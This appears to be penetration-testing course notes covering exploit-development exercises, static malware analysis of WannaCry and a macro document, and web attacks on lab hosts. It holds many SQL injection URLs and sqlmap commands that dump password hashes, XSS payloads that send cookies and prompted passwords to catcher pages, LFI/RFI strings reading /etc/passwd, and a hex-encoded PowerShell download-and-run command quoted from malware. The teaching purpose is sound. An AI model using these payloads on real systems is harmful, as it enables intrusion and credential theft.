@@ -1,0 +1,2950 @@
+                            #######################################
+----------- ############### # Day 1: Intro to Exploit Development  ################ -----------
+                            #######################################
+
+
+Step 1: Host Discovery - what's alive
+	- Ping Sweep
+	nmap -sP <IP-Range>
+
+Step 2: Service Discovery - what's where
+
+	- Port Scan
+	nmap -sS <IP-Range>
+
+Step 3: Service Version Determination
+	- Bannergrab
+	nmap -sV <IP-Range>
+
+Step 4: Vulnerability Research
+	- Search exploit website
+	http://exploit-db.com/search
+
+-------------------------------------------------
+1. App Type
+	- Stand Alone
+	- Client Server		(***vulnserver.exe***)
+	- Web App
+
+2. Input Type
+	- Stand Alone		File/Keyboard/Mouse
+	- Client Server		Logical network port		(***9999***)
+	- Web App		Browser
+
+
+3. Map and fuzz app entry points
+	- Commands, Methods, Verbs, functions, controllers, subroutines
+	TRUN 2100
+
+4. Isolate the crash
+	EIP = 39 6F 43 38
+	       9  o C   8
+
+5. Calculate distance to EIP
+	2006
+
+6. Redirect code execution to mem location you control
+
+7. Insert payload (shellcode)
+--------------------------------------------------------------
+
+#########################################
+# FreeFloat FTP Server Exploit Analysis #
+#########################################
+ 
+ 
+ 
+Analyze the following exploit code:
+https://www.exploit-db.com/exploits/15689/
+ 
+1. What is the target platform that this exploit works against?
+2. What is the variable name for the distance to EIP?
+3. What is the actual distance to EIP in bytes?
+4. Describe what is happening in the variable ‘junk2’
+ 
+ 
+ 
+ 
+Analysis of the training walk-through based on EID: 15689:
+http://45.63.104.73/ff.zip
+ 
+ 
+ 
+ 
+ff1.py
+1. What does the sys module do? Call System Commands
+2. What is sys.argv[1] and sys.argv[2]?
+3. What application entry point is being attacked in this script?
+ 
+ 
+ 
+ff2.py
+1. Explain what is happening in lines 18 - 20 doing.
+2. What pattern_create.rb doing and where can I find it?
+3. Why can’t I just double click the file to run this script?
+ 
+ 
+ 
+ff3.py
+1. Explain what is happening in lines 17 - to 25?
+2. Explain what is happening in lines 30 - to 32?
+3. Why is everything below line 35 commented out?
+ 
+ 
+ 
+ff4.py
+1. Explain what is happening in lines 13 - to 15.
+2. Explain what is happening in line 19.
+3. Why is everything below line 35 commented out?
+ 
+ 
+ 
+Ff5.py
+1. Explain what is happening in line 15.
+2. What is struct.pack?
+3. How big is the shellcode in this script?
+ 
+ 
+ 
+ff6.py
+1. What is the distance to EIP?
+2. How big is the shellcode in this script?
+3. What is the total byte length of the data being sent to this app?
+ 
+ 
+ 
+ 
+ff7.py
+1. What is a tuple in python?
+2. How big is the shellcode in this script?
+3. Did your app crash in from this script?
+ 
+ 
+ 
+ 
+ff8.py
+1. How big is the shellcode in this script?
+2. What is try/except in python?
+3. What is socket.SOCK_STREAM in Python?
+ 
+ 
+ 
+ff9.py
+1. What is going on in lines 19 and 20?
+2. What is the length of the NOPs?
+3. What is socket.SOCK_STREAM in Python?
+ 
+ 
+ 
+ 
+ff010.py
+1. What is going on in lines 18 - 20?
+2. What is going on in lines 29 - 32?
+3. How would a stack adjustment help this script?
+
+
+
+
+
+                            #######################################
+----------- ################ Day 2: Intro to Defensive Cyber Ops  ################ -----------
+                            #######################################
+
+################
+# The Scenario #
+################
+You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts).
+ 
+ 
+The fastest thing you can do is perform static analysis.
+ 
+ 
+ 
+###################
+# Static Analysis #
+###################
+ 
+- After logging please open a terminal window and type the following commands:
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~
+
+mkdir malware_analysis
+
+cd  malware_analysis
+ 
+wget http://45.63.104.73/wannacry.zip
+ 
+unzip wannacry.zip
+     infected
+ 
+file wannacry.exe
+ 
+mv wannacry.exe malware.pdf
+ 
+file malware.pdf
+ 
+mv malware.pdf wannacry.exe
+ 
+hexdump -n 2 -C wannacry.exe
+ 
+----------------------------------------------------------------------
+ 
+ 
+***What is '4d 5a' or 'MZ'***
+Reference:
+http://www.garykessler.net/library/file_sigs.html
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings --all wannacry.exe | head -n 6
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Ok, let's look for the individual strings
+ 
+ 
+---------------------------Type This-----------------------------------
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+####################################
+# Tired of GREP - let's try Python #
+####################################
+Decided to make my own script for this kind of stuff in the future. I
+ 
+Reference1:
+http://45.63.104.73/analyse_malware.py
+ 
+This is a really good script for the basics of static analysis
+ 
+Reference:
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+This is really good for showing some good signatures to add to the Python script
+ 
+ 
+Here is my own script using the signatures (started this yesterday, but still needs work):
+https://pastebin.com/guxzCBmP
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo apt install -y python-pefile
+     strategicsec
+ 
+  
+wget https://pastebin.com/raw/guxzCBmP
+ 
+ 
+mv guxzCBmP am.py
+ 
+ 
+cat am.py | less
+	q
+ 
+python am.py wannacry.exe
+----------------------------------------------------------------------
+
+#####################################################
+# Analyzing Macro Embedded Malware                  #
+# Reference:                                        #
+# https://jon.glass/analyzes-dridex-malware-p1/     #
+#####################################################
+---------------------------Type This-----------------------------------
+cd ~/malware_analysis 
+
+sudo pip install olefile
+     strategicsec
+
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+wget http://45.63.104.73/064016.zip
+ 
+unzip 064016.zip
+     infected
+ 
+python oledump.py 064016.doc
+ 
+python oledump.py 064016.doc -s A4 -v
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A5 -v
+-----------------------------------------------------------------------
+ 
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A3 -v
+ 
+- Look for "GVhkjbjv" and you should see:
+ 
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+ 
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+
+                            #######################################
+##################################
+# Basic: Web Application Testing #
+##################################
+ 
+Most people are going to tell you reference the OWASP Testing guide.
+https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
+ 
+I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.
+ 
+ 
+The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
+   
+    1. Does the website talk to a DB?
+        - Look for parameter passing (ex: site.com/page.php?id=4)
+        - If yes - try SQL Injection
+ 
+    2. Can I or someone else see what I type?
+        - If yes - try XSS
+ 
+    3. Does the page reference a file?
+        - If yes - try LFI/RFI
+ 
+Let's start with some manual testing against 45.77.162.239
+ 
+ 
+Start here:
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/
+-----------------------------------------------------------------------
+ 
+Let's try throwing a single quote (') in there:
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2'
+-------------------------------------------------------------------------------------
+ 
+I get the following error:
+ 
+Unclosed quotation mark after the character string ''.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+ 
+Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+#########################################################################################
+# SQL Injection                                                                         #
+# http://45.63.104.73/1-Intro_To_SQL_Intection.pptx            #
+#########################################################################################
+ 
+ 
+- Another quick way to test for SQLI is to remove the parameter value
+ 
+ 
+#############################
+# Error-Based SQL Injection #
+#############################
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))--     NOTE: "N" - just means to keep going until you run out of databases
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
+---------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+#############################
+# Union-Based SQL Injection #
+#############################
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 order by 100--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 50--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 25--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 10--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 5--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 6--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 7--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 8--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 9--
+http://45.77.162.239/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
+---------------------------------------------------------------------------------------------------------
+ 
+    We are using a union select statement because we are joining the developer's query with one of our own.
+    Reference:
+    http://www.techonthenet.com/sql/union.php
+    The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements.
+    It removes duplicate rows between the various SELECT statements.
+ 
+    Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
+---------------------------------------------------------------------------------------------------------
+    Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
+ 
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
+---------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Another way is to see if you can get the backend to perform an arithmetic function
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=(2)
+http://45.77.162.239/bookdetail.aspx?id=(4-2)  
+http://45.77.162.239/bookdetail.aspx?id=(4-1)
+---------------------------------------------------------------------------------------------------------
+ 
+- This is some true/false logic testing
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 or 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1=2--
+http://45.77.162.239/bookdetail.aspx?id=1*1
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 >-1#
+http://45.77.162.239/bookdetail.aspx?id=2 or 1<99#
+http://45.77.162.239/bookdetail.aspx?id=2 or 1<>1#
+http://45.77.162.239/bookdetail.aspx?id=2 or 2 != 3--
+http://45.77.162.239/bookdetail.aspx?id=2 &0#
+-------------------------------------------------------------------------------------
+ 
+-- Now that we've seen the differences in the webpage with True/False SQL Injection - let's see what we can learn using it
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 and 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 and 1=2--
+http://45.77.162.239/bookdetail.aspx?id=2 and user='joe' and 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 and user='dbo' and 1=1--
+---------------------------------------------------------------------------------------
+ 
+ 
+###############################
+# Blind SQL Injection Testing #
+###############################
+Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
+     
+3 - Total Characters
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--      (Ok, the username is 3 chars long - it waited 10 seconds)
+---------------------------------------------------------------------------------------------------------
+ 
+Let's go for a quick check to see if it's DBO
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
+-------------------------------------------------------------------------------------
+Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
+ 
+D  - 1st Character
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--  
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--  (Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
+---------------------------------------------------------------------------------------------------------
+ 
+B - 2nd Character
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+---------------------------------------------------------------------------------------------------------
+ 
+O - 3rd Character
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--      
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=111) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+---------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+##########
+# Sqlmap #
+##########
+If you want to see how we automate all of the SQL Injection attacks you can log into your StrategicSec-Ubuntu-VM and run the following commands:
+---------------------------Type This-----------------------------------
+cd ~/toolz/sqlmap-dev/
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -b
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --current-user
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --current-db
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --dbs
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp --tables
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns --dump
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns --dump
+python sqlmap.py -u "http://45.77.162.239/bookdetail.aspx?id=2" --users --passwords
+------------------------------------------------------------------------
+ 
+ 
+ 
+#######################
+# Attacking PHP/MySQL #
+#######################
+ 
+Go to LAMP Target homepage
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/
+-------------------------------------------------------------------------------------
+ 
+ 
+Clicking on the Acer Link:
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer
+-------------------------------------------------------------------------------------
+ 
+    - Found parameter passing (answer yes to question 1)
+    - Insert ' to test for SQLI
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer'
+-------------------------------------------------------------------------------------  
+ 
+Page returns the following error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''acer''' at line 1
+ 
+ 
+ 
+In order to perform union-based sql injection - we must first determine the number of columns in this query.
+We do this using the ORDER BY
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 100-- +
+-------------------------------------------------------------------------------------
+ 
+ 
+Page returns the following error:
+Unknown column '100' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 50-- +
+-------------------------------------------------------------------------------------  
+ 
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 25-- +
+-------------------------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '25' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 12-- +
+-------------------------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '12' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 6-- +
+-------------------------------------------------------------------------------------
+---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
+ 
+ 
+ 
+Now we build out the union all select statement with the correct number of columns
+ 
+Reference:
+http://www.techonthenet.com/sql/union.php
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
+-------------------------------------------------------------------------------------
+ 
+ 
+ 
+Now we negate the parameter value 'acer' by turning into the word 'null':
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
+-------------------------------------------------------------------------------------
+ 
+We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
+ 
+ 
+Use a cheat sheet for syntax:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+ 
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a
+------------------------------------------------------------------------------------- -------------------
+ 
+ 
+ 
+ 
+Sometimes students ask about the "-- j" or "-- +" that I append to SQL injection attack string.
+ 
+Here is a good reference for it:
+https://www.symantec.com/connect/blogs/mysql-injection-comments-comments
+ 
+Both attackers and penetration testers alike often forget that MySQL comments deviate from the standard ANSI SQL specification. The double-dash comment syntax was first supported in MySQL 3.23.3. However, in MySQL a double-dash comment "requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on)." This double-dash comment syntax deviation is intended to prevent complications that might arise from the subtraction of negative numbers within SQL queries. Therefore, the classic SQL injection exploit string will not work against backend MySQL databases because the double-dash will be immediately followed by a terminating single quote appended by the web application. However, in most cases a trailing space needs to be appended to the classic SQL exploit string. For the sake of clarity we'll append a trailing space and either a "+" or a letter.
+
+
+
+###############################################################################
+# What is XSS                                                                 #
+# http://45.63.104.73/2-Intro_To_XSS.pptx            #
+###############################################################################
+ 
+OK - what is Cross Site Scripting (XSS)
+ 
+1. Use Firefox to browse to the following location:
+    ---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/
+    -------------------------------------------------------------------------------------
+ 
+    A really simple search page that is vulnerable should come up.
+ 
+ 
+ 
+ 
+2. In the search box type:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>alert('So this is XSS')</script>
+    -------------------------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+ 
+3. In the search box type:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>alert(document.cookie)</script>
+    -------------------------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+4. Now replace that alert script with:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>document.location="http://45.63.104.73/xss_practice/cookie_catcher.php?c="+document.cookie</script>
+    -------------------------------------------------------------------------------------
+ 
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+ 
+ 
+5. Now view the stolen cookie at:
+   ---------------------------Paste this into Firefox-----------------------------------
+   http://45.63.104.73/xss_practice/cookie_stealer_logs.html
+   -------------------------------------------------------------------------------------  
+ 
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+ 
+ 
+ 
+ 
+ 
+ 
+############################
+# A Better Way To Demo XSS #
+############################
+ 
+ 
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+ 
+ 
+Use Firefox to browse to the following location:
+---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/
+-------------------------------------------------------------------------------------  
+ 
+ 
+Paste this in the search box
+----------------------------
+ 
+ 
+Option 1
+--------
+---------------------------Paste this into Firefox-----------------------------------
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+-------------------------------------------------------------------------------------  
+ 
+Now view the stolen cookie at:
+---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/passwords.html
+-------------------------------------------------------------------------------------  
+ 
+ 
+Option 2
+--------
+-------------------------Paste this into Firefox-----------------------------------
+<script>
+username=prompt('Please enter your username',' ');
+password=prompt('Please enter your password',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
+</script>
+-------------------------------------------------------------------------------------  
+ 
+ 
+ 
+Now view the stolen cookie at:
+http://45.63.104.73/xss_practice/username_password_logs.html
+ 
+ 
+ 
+ 
+#########################################
+# Let's try a local file include (LFI)  #
+#########################################
+- Here is an example of an LFI
+- Open this page in Firefox:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=contactus.txt
+-------------------------------------------------------------------------------------
+ 
+ 
+- Notice the page name (showfile.php) and the parameter name (filename) and the filename (contactus.txt)
+- Here you see a direct reference to a file on the local filesystem of the victim machine.
+- You can attack this by doing the following:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=/etc/passwd
+-------------------------------------------------------------------------------------
+ 
+ 
+- This is an example of a Local File Include (LFI), to change this attack into a Remote File Include (RFI) you need some content from
+- somewhere else on the Internet. Here is an example of a text file on the web:
+-------------------------Paste this into Firefox-----------------------------------
+http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+-------------------------------------------------------------------------------------
+ 
+- Now we can attack the target via RFI like this:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+-------------------------------------------------------------------------------------
+ 
+ 
+ 
+###############################
+# How much fuzzing is enough? #
+###############################
+There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.
+ 
+Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.
+ 
+ 
+Step 1: Ask yourself the 3 questions per page of the site.
+ 
+Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)
+ 
+Step 3: When you load your fuzz strings - use the following decision tree
+ 
+    - Are the fuzz strings causing a default error message (example 404)?
+        - If this is the case then it is most likely NOT vulnerable
+ 
+    - Are the fuzz strings causing a WAF or LB custom error message?
+        - If this is the case then you need to find an encoding method to bypass
+ 
+ 
+    - Are the fuzz strings causing an error message that discloses the backend type?
+        - If yes, then identify DB type and find correct syntax to successfully exploit
+        - Some example strings that I use are:
+            '
+            "
+            ()          <----- Take the parameter value and put it in parenthesis
+            (5-1)       <----- See if you can perform an arithmetic function
+ 
+ 
+    - Are the fuzz strings rendering executable code?
+        - If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
+        - Some example strings that I use are:
+            <b>hello</b>
+            <u>hello</u>
+            <script>alert(123);</script>
+            <script>alert(xss);</script>
+            <script>alert('xss');</script>
+            <script>alert("xss");</script>
+
+
+###############################################################
+# Question 1: What is the process that you use when you test? #
+###############################################################
+ 
+Step 1: Automated Testing
+ 
+Step 1a: Web Application vulnerability scanners
+-----------------------------------------------
+- Run two (2) unauthenticated vulnerability scans against the target
+- Run two (2) authenticated vulnerability scans against the target with low-level user credentials
+- Run two (2) authenticated vulnerability scans against the target with admin privileges
+ 
+The web application vulnerability scanners that I use for this process are (HP Web Inspect, and Acunetix).
+ 
+A good web application vulnerability scanner comparison website is here:
+http://sectoolmarket.com/price-and-feature-comparison-of-web-application-scanners-unified-list.html
+ 
+ 
+Look to see if there are cases where both scanners identify the same vulnerability. Investigate these cases thoroughly, ensure that it is NOT a false positive, and report the issue.
+ 
+When you run into cases where one (1) scanner identifies a vulnerability that the other scanner does not you should still investigate these cases thoroughly, ensure that it is NOT a false positive, and report the issue.
+ 
+ 
+Be sure to look for scans that take more than 3 or 4 hours as your scanner may have lost its active session and is probably not actually finding real vulnerabilities anymore.
+ 
+ 
+Also, be sure to save the scan results and logs. I usually provide this data to the customer.
+ 
+ 
+ 
+Step 1b: Directory Brute Forcer
+-------------------------------
+I like to run DirBuster or a similar tool. This is great to find hidden gems (backups of the website, information leakage, unreferenced files, dev sites, etc).
+ 
+ 
+ 
+Step 2: Manual Testing
+ 
+Try to do this step while your automated scans are running. Use Burp Suite or the Tamper Data Firefox extension to browse EVERY PAGE of the website (if this is realistic).
+ 
